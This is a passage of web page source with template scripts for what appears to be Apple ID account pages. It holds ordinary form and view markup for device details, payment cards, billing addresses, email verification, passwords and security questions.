<idms-modal {(show)}="_showModal" {mode}="mode">
    <content></content>
</idms-modal>

</script>
<script type="text/stache" id="jstache_1511171693">


<div class="devices-info" role="group" tabindex="-1" aria-labelledby="deviceInfoTitle">
  <div class="header">
    <h5 class="name" id="deviceInfoTitle">{{name}}</h5>
      {{#latestBackupDate}}
        <span class="col-sm-12 last-backup">Latest Backup {{latestBackupDate}} {{latestBackupTime}}</span>
      {{/latestBackupDate}}
    <!--<button class="btn btn-link show-location">Show Location in Find My {{deviceTypeTitle}}</button>-->
  </div>
  {{#if applePayCards.length}}
    <div class="apple-pay sep sep-top">
      <span class="col1">Apple Pay: </span>
      <span class="col2">
        {{#each applePayCards}}
            <div> {{typeName}} ({{obfuscatedNumber}})</div>
        {{/each}}

            <button class="btn btn-link card-remove-all">
                {{#is applePayCards.length 1}}
                Remove...
                {{else}}
                Remove all...
                {{/is}}
            </button>
      </span>
    </div>
  {{/if}}
  <div class="model-data sep-top">
    {{#modelName}}
      <div class="model">
        <span class="col1">Model: </span>
        <span class="col2">{{modelName}}</span>
      </div>
    {{/modelName}}
    {{#osAndVersion}}
      <div class="os-version">
          <span class="col1">Version:</span>
          <span class="col2">{{osAndVersion}}</span>
      </div>
    {{/osAndVersion}}
    {{#phoneNumber.name}}
      <div class="model">
        <span class="col1">Phone number: </span>
        <span class="col2">{{phoneNumber.name}}</span>
      </div>
    {{/phoneNumber.name}}
    {{#serialNumber}}
      <div class="model">
        <span class="col1">Serial Number: </span>
        <span class="col2">{{serialNumber}}</span>
      </div>
    {{/serialNumber}}
    {{#imei}}
      <div class="model">
        <span class="col1">IMEI: </span>
        <span class="col2">{{imei}}</span>
      </div>
    {{/imei}}
  </div>
  {{#is account.type "hsa2"}}
    {{#needsFixFor2FA}}
    <div class="general-info sep-top">
        <p>
            To use two-factor authentication on this device, <a target="_blank" href="http://support.apple.com/kb/HT205520">follow these instructions.</a>
        </p>
    </div>
    {{/needsFixFor2FA}}
  {{/is}}
  <div class="sep-top remove-top">
      <button class="btn btn-link remove-this-device">Remove {{deviceClassDisplayName}}</button>
  </div>

    <div class="aid-footer flow-footer clearfix mobile-only">
        <div class="btn-group flow-controls pull-right">
            <button type="button" class="btn btn-link first close-details">Back</button>
            <button type="button" style="display:none;"></button>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1057385298">


{{#if _isShown}}
  <div class="idms-popover-container" {{#if ariaHide}}aria-hidden="true"{{/if}}>
    <div class="idms-popover-wrapper
                idms-popover-wrapper-direction-{{#_direction}}{{.}}{{/_direction}}
                idms-popover-wrapper-align-{{#_align}}{{.}}{{/_align}}"
         style="top:{{_rect.top}}px;
                left:{{_rect.left}}px;
                width:{{_rect.width}}px;">
      <div id="idms-popover-{{uid}}"
           class="idms-popover
                  idms-popover-direction-{{#_direction}}{{.}}{{/_direction}}
                  idms-popover-align-{{#_align}}{{.}}{{/_align}}
                  idms-popover-type-{{#type}}{{.}}{{/type}}
                  {{#if _openAnimationInProgress}}idms-popover-animation-open{{/if}}
                  {{#if _closeAnimationInProgress}}idms-popover-animation-close{{/if}}">
            <content></content>
      </div>
    </div>
  </div>
{{/if}}

</script>
<script type="text/stache" id="jstache_823826465">


<div class="basic-input">
  {{#if srLabelText}}
  <label class="sr-only" for="idms-input-{{uid}}">{{srLabelText}}</label>
  {{/if}}
  {{^if options.length}}
  <input id="idms-input-{{uid}}"
         {$type}="inputType"
         class="generic-input-field {{classes}} form-control field {{#if errorMessage}} error {{/if}}{{#if errors.hasErrors}} has-errors{{/if}}"
         {$value}="value"
         ($input)="attr('value', $element.val())"
         {$placeholder}="placeholder"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"
         {$aria-required}="isRequired"
         {$aria-invalid}="hasErrors"
         aria-describedby="idms-input-error-{{uid}}"/>
  {{else}}
  <select id="idms-input-{{uid}}"
          class="generic-input-field {{classes}} form-control field {{#if errorMessage}} error {{/if}}{{#if errors.hasErrors}} has-errors{{/if}}"
          value="{{value}}"
          ($input)="attr('value', $element.val())"
          aria-required="{{#if isRequired}}true{{else}}false{{/if}}"
          aria-invalid="{{#if hasErrors}}true{{else}}false{{/if}}"
          aria-describedby="idms-input-error-{{uid}}">
    {{#if placeholder}}
    <option value="" {{#unless value}}selected="selected"{{/unless}}>{{placeholder}}</option>
    {{/if}}
    {{#each options}}
    <option value="{{#if value}}{{value}}{{else}}{{.}}{{/if}}">
      {{#if text}}
      {{text}}
      {{else}}
      {{.}}
      {{/if}}
    </option>
    {{/each}}
  </select>
  {{/if}}

  {{#if usePopover}}
  <idms-popover {show}="hasErrorsAndFocus"
                anchor-element="#idms-input-{{uid}}"
                aria-hide="true"
                type="error">
    <div id="idms-input-error-{{uid}}">{{errorMessage}}</div>
  </idms-popover>
  {{/if}}

</div>

</script>
<script type="text/stache" id="jstache_138019743">


<section class="billing-address address">
    <h3 class="section-subtitle">BILLING ADDRESS</h3>

    <div class="row mobile-narrow two-columns">
        {{#if addressFeatures.firstNameOrderFirst}}

    <div class="col-sm-6 col">
              <div class="pop-wrapper field-pop-wrapper">
                <div class="form-group">
                    <basic-input classes="content-input {{#if errors.firstName.hasErrors}}error{{/if}} billing-address-firstName"
                                 sr-label-text='First Name'
                                 placeholder='first name'
                                 is-required='true'
                                 {^@validate}="validators.firstName"
                                 validate-on-blur='false'
                                 error-strings.empty='Enter a first name.'
                                 {use-popover}="usePopover"
                                 {(errors)}='nameOnCardErrors.firstName'
                                 {(value)}="nameOnCard.firstName"></basic-input>
                </div>
            </div>
    </div>

    <div class="col-sm-6 col">
         <div class="pop-wrapper field-pop-wrapper">
           <div class="form-group">
               <basic-input classes="content-input {{#if errors.lastName.hasErrors}}error{{/if}} billing-address-lastName"
                            sr-label-text='Last Name'
                            placeholder='last name'
                            is-required='true'
                            {^@validate}="validators.lastName"
                            validate-on-blur='false'
                            {use-popover}="usePopover"
                            error-strings.empty='Enter a last name.'
                            {(errors)}='nameOnCardErrors.lastName'
                            {(value)}="nameOnCard.lastName"></basic-input>
           </div>
       </div>
    </div>


        {{else}}
        <div class="col-sm-6 col">
          <div class="pop-wrapper field-pop-wrapper">
            <div class="form-group">
                <basic-input classes="content-input {{#if errors.lastName.hasErrors}}error{{/if}} billing-address-lastName"
                             sr-label-text='Last Name'
                             placeholder='last name'
                             is-required='true'
                             {^@validate}="validators.lastName"
                             validate-on-blur='false'
                             {use-popover}="usePopover"
                             error-strings.empty='Enter a last name.'
                             {(errors)}='nameOnCardErrors.lastName'
                             {(value)}="nameOnCard.lastName"></basic-input>
            </div>
          </div>
        </div>


        <div class="col-sm-6 col">
          <div class="pop-wrapper field-pop-wrapper">
            <div class="form-group">
                <basic-input classes="content-input {{#if errors.firstName.hasErrors}}error{{/if}} billing-address-firstName"
                             sr-label-text='First Name'
                             placeholder='first name'
                             is-required='true'
                             {^@validate}="validators.firstName"
                             validate-on-blur='false'
                             error-strings.empty='Enter a first name.'
                             {use-popover}="usePopover"
                             {(errors)}='nameOnCardErrors.firstName'
                             {(value)}="nameOnCard.firstName"></basic-input>
            </div>
          </div>
        </div>
        {{/if}}
    </div>

    <idms-address is-billing-address="true"
                  {(phone-number)}="phoneNumber"
                  {show-phone-input}="showPhoneInput"
                  {initial-phone-number}="initialPhoneNumber"
                  {(phone-number-errors)}="phoneNumberErrors"
                  {^is-address-dirty}="isBillingAddressDirty"
                  {^address}="newBillingAddress"
                  {^@validate-address}="validateAddress"
                  {^address-features}="newAddressFeatures"
                  {country-options}="countryOptions"
                  {localized-strings}="localizedStrings"
                  {initial-address-features}="addressFeatures"
                  {default-country-code}="defaultCountryCode"
                  reset-on-country-change="true"
                  {use-popover}="usePopover"
                  {validators}="validators"
                  {(errors)}="billingAddressErrors"
                  {initial-address}="initialBillingAddress">
    </idms-address>
</section>

</script>
<script type="text/stache" id="jstache_1940623505">


<div class="pop-wrapper field-pop-wrapper">
    <div class="form-group">
        <numeric-input classes="content-input credit-card-number"
                     sr-label-text='Credit Card'
                     placeholder='credit card number'
                     is-required='true'
                     {^@validate}="validate"
                     validate-on-blur='false'
                     {use-popover}="usePopover"
                     error-strings.empty='Enter a card number.'
                     {(errors)}='errors'
                     {(value)}="number"></numeric-input>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1674965653">


<div class="pop-wrapper field-pop-wrapper">
    <div class="form-group ">
        <div class="pop-wrapper pop-inline question-mark-wrapper">
            <button id="cvv_about" class="btn btn-link btn-icon list-action cvv-about">
                <i class="icon icon_help"></i><span class="sr-only">Where to find your Security Code:</span>
            </button>
            {{#if showHelper}}
            <div class="popover pop-flow pop-creditcards" role="group" tabindex="-1" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="pop-content popover-content">
                    <div class="popover-body">
                        <div id="cvv_popover">
                            <div class="cvv-title">
                                Where to find your Security Code:
                            </div>
                            <div class="cvv-visa">
                                <div class="cvv-sub-title">
                                    {{#if billingFeatures.isUnionPaySupported}}
                                    UnionPay / Visa / MasterCard / Discover:
                                    {{else}}
                                    Visa / Mastercard / Discover:
                                    {{/if}}
                                </div>
                                <img src="https://appleid.cdn-apple.com/static/bin/cb557578914/dist/assets/images/cvv_visa_mc.png" class="credit-card" />
                            </div>
                            <div class="cvv-amex">
                                <div class="cvv-sub-title">American Express:</div>
                                <img src="https://appleid.cdn-apple.com/static/bin/cb2499579377/dist/assets/images/cvv_amex.png" class="credit-card" />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            {{/if}}
        </div>
        <numeric-input classes="content-input cvv-number"
                       sr-label-text='CVV'
                       placeholder='security code'
                       is-required='true'
                       {^@validate}="validate"
                       validate-on-blur='false'
                       max-length="4"
                       {use-popover}="usePopover"
                       error-strings.empty='Enter the security code on your card.'
                       {(errors)}='errors'
                       {(value)}="cvv"></numeric-input>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1084951409">


<div class="pop-wrapper field-pop-wrapper">
    <div class="form-group">
        <date focus-placeholder="mm/yyyy"
              format="mm/yyyy"
              classes="form-control form-input cc-expiration-date {{#if hasErrors}}errors has-errors{{/if}}"
              placeholder="mm/yyyy"
              error-strings.date_invalid='Enter a valid expiration date.'
              {^@validate}="validate"
              {(input-date)}="expirationMonthYear"
              {(errors)}="errors">
        </date>
    </div>
    {{#if usePopover}}
    <idms-popover {show}="hasErrorsAndFocus"
                  anchor-element=".cc-expiration-date"
                  type="error">
      <div id="idms-input-error-{{uid}}">{{errorMessage}}</div>
    </idms-popover>
    {{/if}}
</div>

</script>
<script type="text/stache" id="jstache_1183721210">


<div class="form-group">
  <basic-input classes="content-input form-control {{#if errors.paymentMethod.partnerLogin.hasErrors}}has-errors{{/if}}"
               sr-label-text='Alipay ID'
               placeholder='email or mobile phone number'
               {(value)}="paymentMethod.partnerLogin"
               {^@validate}="validators.partnerLogin"
               validate-on-blur='false'
               is-required="true"
               {use-popover}="usePopover"
               error-strings.empty='Enter your Alipay ID.'
               {(errors)}="errors.paymentMethod.partnerLogin"></basic-input>
</div>

{{#is partnerLoginType 'phone'}} 
<div class="form-group">
  <basic-input classes="content-input form-control {{#if errors.paymentMethod.nationalId.hasErrors}}has-errors{{/if}}"
               sr-label-text='Chinese National ID'
               placeholder='last 5 characters of Chinese national ID'
               {(value)}="paymentMethod.nationalId"
               {^@validate}="validators.nationalId"
               validate-on-blur='false'
               is-required="true"
               {use-popover}="usePopover"
               error-strings.empty='Enter the last 5 characters of your Chinese National ID.'
               {(errors)}="errors.paymentMethod.nationalId"></basic-input>
</div>
{{/is}}

{{#is partnerLoginType 'email'}}
    <div class="form-group">
      <phone-input placeholder="mobile phone number"
                   {countries}="smsSupportedCountries"
                   {(errors)}="errors.phoneNumber.number"
                   {(value)}="phoneNumber.number"
                   {^@validate}="validators.phoneNumber"
                   {(country-code)}="phoneNumber.countryCode"
                   field-name="alipay-phone-input"></phone-input>
    </div>
    {{#if usePopover}}
    <idms-popover {show}="phoneHasErrorsAndFocus"
                  anchor-element="#alipay-phone-input"
                  type="error">
      <div id="idms-input-error-{{uid}}">{{errors.phoneNumber.number.main.message}}</div>
    </idms-popover>
    {{/if}}
{{/is}}

</script>
<script type="text/stache" id="jstache_1885766566">


<div class="detail">
    {{#if creditCard.expired}}
        
        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Expired Payment Method" class="expired-cc" />
    {{/if}}
    {{#if creditCard.carrierBilling}}
        Mobile Phone Billing
    {{else}}
        {{creditCard.paymentMethodName}}
    {{/if}}
    {{#if creditCard.expired}}
        <small>(Expired)</small>
    {{/if}}
</div>
{{#if creditCard.expired}}
<div class="detail">
    <button class="btn btn-link update-card acdn-btn-edit" ($click)="openEdit('payment-method')" role="button">Update Card Information</button>
</div>
{{/if}}

</script>
<script type="text/stache" id="jstache_1830797262">


<div class="address-view">
    <div class="flow-subsection">
        <div class="detail">
            <span class="show wrap">{{address.line1}}{{#if address.line2}}, {{address.line2}}{{/if}}</span>
            {{#if address.line3}}
            <span class="show wrap">{{address.line3}}</span>
            {{/if}}
            {{#if address.suburb}}
            <span class="show wrap">{{address.suburb}}</span>
            {{/if}}
            <span class="show wrap">{{#unless addressFeatures.hideCity}}{{address.city}}, {{/unless}}{{#if addressFeatures.countyRequired}}{{address.county}}, {{else}}{{address.stateProvinceName}}{{/if}} {{address.postalCode}}</span>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_870686845">


<div class="email-input">
  <input type="email"
         class="generic-input-field {{classes}} form-control field{{#if errors.hasErrors}} error has-errors{{/if}} {{classes}}"
         can-field="{inputValue}"
         placeholder="{{placeholder}}"
         autocomplete="off" 
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"
         maxlength="254"/>
</div>
</script>
<script type="text/stache" id="jstache_1353759786">


<div id="security-code-wrap-{{uid}}" class="security-code-wrap security-code-{{inputBoxes.length}} {{#if split}} split {{/if}}"
     localisedDigit={{localisedDigit}}>
    {{#each inputBoxes}}
        <div class="field-wrap">
            <input
                    type="{{type}}"
                    id="char{{%index}}"
                    class="form-control char-field{{#if errors.hasErrors}} error has-errors{{/if}}"
                    maxlength="1"
                    aria-label="{{srContext}} {{localisedDigit}} {{#indexNum}}"
                    placeholder="{{placeholder}}"
                    autocorrect="off"
                    autocomplete="off"
                    autocapitalize="off"
                    aria-describedby="{{#if errorLabel}}{{errorLabel}}{{else}}idms-input-error-{{uid}}{{/if}}"
                    aria-invalid="{{#if hasErrors}}true{{else}}false{{/if}}"
                    data-index="{{%index}}"
                    spellcheck="false"/>
        </div>
    {{/each}}
    {{#unless errorLabel}}
      {{#if usePopover}}
          <idms-popover {show}="hasErrors"
                        anchor-element="#security-code-wrap-{{uid}}"
                        auto-close="false"
                        type="error">
              <div id="idms-input-error-{{uid}}">{{errorMessage}}</div>
          </idms-popover>
      {{else}}
        <label id="idms-input-error-{{uid}}" class="sr-only">{{errorMessage}}</label>
      {{/if}}
    {{/unless}}
</div>

</script>
<script type="text/stache" id="jstache_2121375578">


<div class="popover pop-flow pop-recycled not-mobile" role="group" tabindex="0" style="display: none;">
    <div class="pop-arrow arrow"></div>
    <div class="pop-content popover-content">
        <div class="popover-body">
            <p>We do not recommend using email addresses issued by a network provider.</p>
        </div>
    </div>
</div>
<div class="mobile-only description" role="alert">
    <p class="domain-warning-mobile">We do not recommend using email addresses issued by a network provider.</p>
</div>
</script>
<script type="text/stache" id="jstache_1908514644">


<div class="change-appleid-alias-warning pop-wrapper field-pop-wrapper">
    <span class="intro">
        <b>Change your Apple ID to "{{newEmail}}"?</b>
    </span>
    <p class="details">
        {{#is aliases.length 1}}
        If you make this change, you will no longer be able to use other email addresses as your Apple ID.
        {{/is}}
        {{#is aliases.length 2}}
        If you make this change, you will no longer be able to use third-party email addresses as your Apple ID. You will be able to use <b>"{{aliases.0}}"</b> or <b>"{{aliases.1}}"</b>
        {{/is}}
        {{#is aliases.length 3}}
        If you make this change, you will no longer be able to use third-party email addresses as your Apple ID. You will be able to use <b>"{{aliases.0}}"</b>, <b>"{{aliases.1}}"</b> or <b>"{{aliases.2}}"</b>
        {{/is}}
    </p>
    <div class="aid-footer flow-footer clearfix">
        <div class="btn-group flow-controls pull-right">

            <loading loading="{changeLoading}"></loading>
            <button class="btn btn-link first alias-warning-cancel" ($click)="clicked('Cancel')">Cancel</button>
            <button class="btn btn-link last alias-warning-change" ($click)="clicked('Change')">Change</button>
            {{#if errors.hasErrors}}
            <div class="errorPop-body popover" role="tooltip">
                <div class="errorPop-arrow arrow"></div>
                <div class="errorPop-content popover-content">
                    {{errors.main.message}}
                </div>
            </div>
            {{/if}}
        </div>

    </div>
</div>
</script>
<script type="text/stache" id="jstache_1057189514">


<div class="verify-primary-email-wrapper verify-email-wrapper step{{step}}">
    <div class="popover-body">
        {{#is step "0"}}
            <div class="step{{step}} intro">
                This address has not been verified.
            </div>
            <div class="details">
                An email address must be verified before it can be used with your account.
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right{{#is loading 'continueLoading'}} loading{{/is}}">
        	        <loading loading="{continueLoading}"></loading>
             	        <button type="button" class="btn btn-link first cancel">
        		    	    Cancel
                        </button>

    		        <button type="button" class="btn btn-link last continueverify">
                	    Verify
                    </button>

    	        </div>
            </div>
        {{/is}}
        {{#is step "1"}}
            <div class="step{{step}} intro">
                An email with a verification code has been sent to <span class="graceful-wrap">{{address}}</span>. Enter the code here:
            </div>
            <div class="details">
                <div class="pop-wrapper field-pop-wrapper">
                   <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" type="tel" localisedigit="Digit"></security-code>
                   {{#if errors.code.hasErrors}}
                        <div class="errorPop-body popover" role="tooltip">
                            <div id="arrow" class="errorPop-arrow arrow"></div>
                            <div class="errorPop-content popover-content">
                                {{{errors.code.main.message}}}
                            </div>
                        </div>
                   {{/if}}
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                    <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                        <button type="button" class="btn btn-link resend new-code">
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>
                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{verifyLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}>Verify</button>
                </div>
            </div>
        {{/is}}
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1858060864">


<div class="verify-email-wrapper step{{step}}">
    <div class="popover-body">
        {{#is step "0"}}
            <div class="step{{step}} intro">
                This address has not been verified.
            </div>
            <div class="details">
                An email address must be verified before it can be used with your account.
            </div>
            <div class="aid-footer flow-footer clearfix">
    	        <div class="btn-group flow-controls pull-left {{#is loading 'loadingDelete'}} loading{{/is}}">
    		        <button type="button" class="btn btn-link remove-email">
            	        Delete Email
        	        </button>
                    <loading loading="{loadingDelete}"></loading>
                </div>
                <div class="btn-group flow-controls pull-right{{#is loading 'continueLoading'}} loading{{/is}}">
        	        <loading loading="{continueLoading}"></loading>
             	        <button type="button" class="btn btn-link first cancel">
        		    	    Cancel
                        </button>

    		        <button type="button" class="btn btn-link last continueverify">
                	    Verify
                    </button>

    	        </div>
            </div>
        {{/is}}
        {{#is step "1"}}
            <div class="step{{step}} intro">
                An email with a verification code has been sent to <span class="graceful-wrap">{{address}}</span>. Enter the code here:
            </div>
            <div class="details">
                <div class="pop-wrapper field-pop-wrapper">
                   <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" type="tel" localisedigit="Digit"></security-code>
                   {{#if errors.code.hasErrors}}
                        <div class="errorPop-body popover" role="tooltip" style="margin-top: -36px;">
                            <div id="arrow" class="errorPop-arrow arrow"></div>
                            <div class="errorPop-content popover-content">
                                {{{errors.code.main.message}}}
                            </div>
                        </div>
                   {{/if}}
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                {{^errors.code.hasErrors}}
                    <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                        <button type="button" class="btn btn-link resend new-code">
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>
                {{/errors.code.hasErrors}}
                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{verifyLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}>Verify</button>
                </div>
            </div>
        {{/is}}
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1331616837">


<input class="form-control field input-text {{#if errorMessage}} error {{/if}}{{#if fieldErrors.password.hasErrors}} error has-errors{{/if}}"
       id="{{inputId}}"
       placeholder="{{placeholder}}"
       type="password"
       errors="{errors}"
       can-field="{value}"
       autocorrect="off"
       autocapitalize="off"
       spellcheck="false" />

</script>
<script type="text/stache" id="jstache_1583628293">


<div class="password-input">
  <input type="password"
         class="generic-input-field {{classes}} form-control field {{#if errorMessage}} error {{/if}}{{#if errors.hasErrors}} error has-errors{{/if}}"
         can-field="{value}"
         placeholder="{{placeholder}}"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false" />
</div>

</script>
<script type="text/stache" id="jstache_1851461820">


<input class="pwd {{#unless afterFirstBlur}} override{{/unless}}{{#if errors.hasErrors}} error has-errors{{/if}} {{classes}}"
       id="{{inputId}}"
       aria-required="true"
       autocomplete="off" placeholder="{{placeholder}}" type="password" errors="{errors}" can-field="{value}"/>

</script>
<script type="text/stache" id="jstache_953204051">


<div class="password-strength-wrap {{#if show}}showStrength{{/if}}" aria-atomic="true" role="alert" {{#if popoverId}}id="{{popoverId}}" {{/if}}>
    <div class="password-strength default-style {{^if inlineStyle}} popover-bottom{{/if}} {{classes}}">
        <div {{^rulesFailing}}aria-hidden="true"{{/rulesFailing}}>{{#localize 'password.yourPasswordMustHaveColon'}}{{/localize}}</div>

        {{#changePasswordPolicy.type}}
            {{#is changePasswordPolicy.type 'simple'}}
                <div class="{{#errors.map.max_characters}}error{{/errors.map.max_characters}} {{^errors.map.max_characters}}success{{/errors.map.max_characters}}">
                    <span class="icon icon_green_check "></span>
             <span class="message" {{^errors.map.max_characters}}aria-hidden="true"{{/errors.map.max_characters}}>
                {{changePasswordPolicy.length}} {{#localize 'password.maxChars'}}{{/localize}}
             </span>
                </div>
            {{/is}}

            {{^is changePasswordPolicy.type 'simple'}}
                <div class="{{#if errors.map.min_eight_characters}} error{{else}} success{{/if}}">
                    <span class="icon icon_green_check "></span>
             <span class="message" {{^errors.map.min_eight_characters}}aria-hidden="true"{{/errors.map.min_eight_characters}}>
                 {{#localize 'password.eightChar'}}{{/localize}}
             </span>
                </div>
                <div class="success {{#if errors.map.one_upper}} error{{/if}}{{#if errors.map.one_lower}} error{{/if}}">
                    <span class="icon icon_green_check "></span>
             <span class="message" {{^errors.map.one_upper}}aria-hidden="true"{{/errors.map.one_upper}}>
                 {{#localize 'password.upperAndLowercase'}}{{/localize}}
             </span>
                </div>
                <div class="{{#if errors.map.one_number}}error{{else}}success{{/if}}">
                    <span class="icon icon_green_check "></span>
            <span class="message" {{^errors.map.one_number}}aria-hidden="true"{{/errors.map.one_number}}>
                {{#localize 'password.atLeastOneNumber'}}{{/localize}}
            </span>
                </div>
            {{/is}}
        {{/changePasswordPolicy.type}}

        <div class="title" aria-hidden="true"><span>{{#localize 'password.passwordStrength'}}{{/localize}}</span>
            {{#unless errors.map.one_number}}
                {{#unless errors.map.one_upper}}
                    {{#unless errors.map.one_lower}}
                        {{#unless errors.map.min_eight_characters}}
                            <span class="hideWeak {{strength}}">{{#localize 'password.weak'}}{{/localize}} </span>
                            <span class="hideModerate {{strength}}">{{#localize 'password.moderate'}}{{/localize}}</span>
                            <span class="hideStrong {{strength}}">{{#localize 'password.strong'}}{{/localize}}</span>
                        {{/unless}}
                    {{/unless}}
                {{/unless}}
            {{/unless}}
        </div>
        <div class="progress">
            <div class="progress-bar {{strength}}" role="progressbar" aria-valuenow="{{percentage}}" aria-valuemin="0"
                 aria-valuemax="100" style="width:{{percentage}}%">
                <span class="sr-only">{{percentage}}</span>
            </div>
        </div>

        <span class="errorMsg {{#if errors.map.three_indentical}}show{{/if}}">{{#localize 'password.consecutiveIdenticalChar'}}{{/localize}} </span>
        <span class="errorMsg {{#if errors.map.common_password}}show{{/if}}">{{#localize 'password.easilyGuessed'}}{{/localize}}</span>
        <span class="errorMsg {{#if errors.map.used_in_past_year}}show{{/if}}">{{#localize 'password.usedPastYear'}}{{/localize}}</span>
        <span class="errorMsg {{#if errors.map.passwords_must_match}}show{{/if}}">{{#localize 'password.notAppleID'}}{{/localize}}</span>
        <span class="errorMsg {{#if errors.map.server_error}}show{{/if}}">{{errors.map.server_error}}</span>

        {{#unless errors.map.three_indentical}}
            {{#unless errors.map.common_password}}
                {{#unless errors.map.used_in_past_year}}
                    {{#unless errors.map.passwords_must_match}}
                        {{#unless errors.map.server_error}}
                            <span class="hint">{{#localize 'password.usedOtherWebsite'}}{{/localize}}</span>
                        {{/unless}}
                    {{/unless}}
                {{/unless}}
            {{/unless}}
        {{/unless}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_2067989855">


<div class="phone-input">
	<div class="form-group">
	    <div class="select-countrycode">
            <label class="sr-only" for="countryCode">Country Options</label>
            <div class="select-wrapper form-element country-select-wrapper{{#if errors.hasErrors}} error has-errors{{/if}}">
                <select {($value)}="countryCode" name="countryCode" id="countryCode"
                        class="form-control form-cell form-dropdown country-select{{#if errors.hasErrors}} error has-errors{{/if}}">
                    {{#each countries}}
                    <option {{#is countryCode code2}}selected="selected"{{/is}} value="{{code2}}">{{dialCodeDisplay}}</option>
                    {{/each}}
                </select>
                {{#toolkit}}
                    <span class="form-icon icon icon-chevrondown icon_down_chevron" aria-hidden="true"> </span>
                {{/if}}
            </div>
	    </div>
        <input type="tel"
               class="force-ltr placeholder-default-direction form-control form-cell form-textbox form-textbox-text form-field{{#if errors.hasErrors}} error has-errors{{/if}}"
               placeholder="{{placeholder}}"
               id="{{fieldName}}"
               name="{{fieldName}}"
               can-field="{value}"
               autocomplete="off"
               autocapitalize="off"
               autocorrect="off"
               spellcheck="false" />
    </div>
</div>

</script>
<script type="text/stache" id="jstache_255658262">


<div class="verify-email-wrapper step{{step}}">
    <div class="popover-body">
        {{#is step "0"}}
            <div class="step{{step}} intro">
                This address has not been verified.
            </div>
            <div class="details">
                {{#is account.type "hsa2"}}
                    A notification email address must be verified before it can be used with your account.
                {{/if}}
                {{#is account.type "hsa1"}}
                    A notification email address must be verified before it can be used with your account.
                 {{/if}}
                {{#is account.type "sa"}}
                    A rescue email address must be verified before it can be used with your account.
                {{/if}}
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right{{#is loading 'continueLoading'}} loading{{/is}}">
                    <loading loading="{continueLoading}"></loading>
                        <button type="button" class="btn btn-link first cancel">
                        Cancel
                        </button>
                    <button type="button" class="btn btn-link last continueverify">
                        Verify
                    </button>
                </div>
            </div>
        {{/is}}
        {{#is step "1"}}
            <div class="step{{step}} intro">
                An email with a verification code has been sent to <span class="graceful-wrap">{{account.security.rescueEmail}}</span>. Enter the code here:
            </div>
            <div class="details">
                <div class="pop-wrapper field-pop-wrapper clearfix">
                    <div class="security-code-wrapper pull-left">
                        <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" type="tel" localisedigit="Digit"></security-code>
                    </div>
                    {{#if errors.code.hasErrors}}
                    <div class="popover errorPop-body" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{{errors.code.main.message}}}
                        </div>
                    </div>
                    {{/if}}
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">

                    <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                        <button type="button" class="btn btn-link resend new-code" {{#errors.code.hasErrors}} disabled{{/errors.code.hasErrors}}{{#verifyLoading}} disabled{{/verifyLoading}}>
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>

                {{#if errors.email.hasErrors}}
                    <div class="verify-error errorPop-body popover" role="tooltip">
                        <div id="arrow" class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{errors.email.main.message}}
                        </div>
                    </div>
                {{/if}}
                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{verifyLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}>Verify</button>
                </div>
            </div>
        {{/is}}
    </div>
</div>
</script>
<script type="text/stache" id="jstache_2010319735">


{{#each qaModel}}
{{#questions.length}}
    <div class="question clearfix">
        <div class="form-group">
            <div class="pop-wrapper field-pop-wrapper field-wrapper field-question">
                <div class="select-wrapper">
                    <select name="question{{%index}}" id="question{{%index}}" class="form-control" data-index="{{%index}}"
                            aria-label='Choose question {{%indexOffset 1}}'>
                        <option value="" selected="selected" disabled>Choose a Question...</option>
                        {{#each questions}}
                            <option value="{{ id }}"{{#isQuestionSelected}} selected{{/isQuestionSelected}}>{{ question }}</option>
                        {{/questions}}
                    </select>
                </div>
                {{#errors.question.showError}}
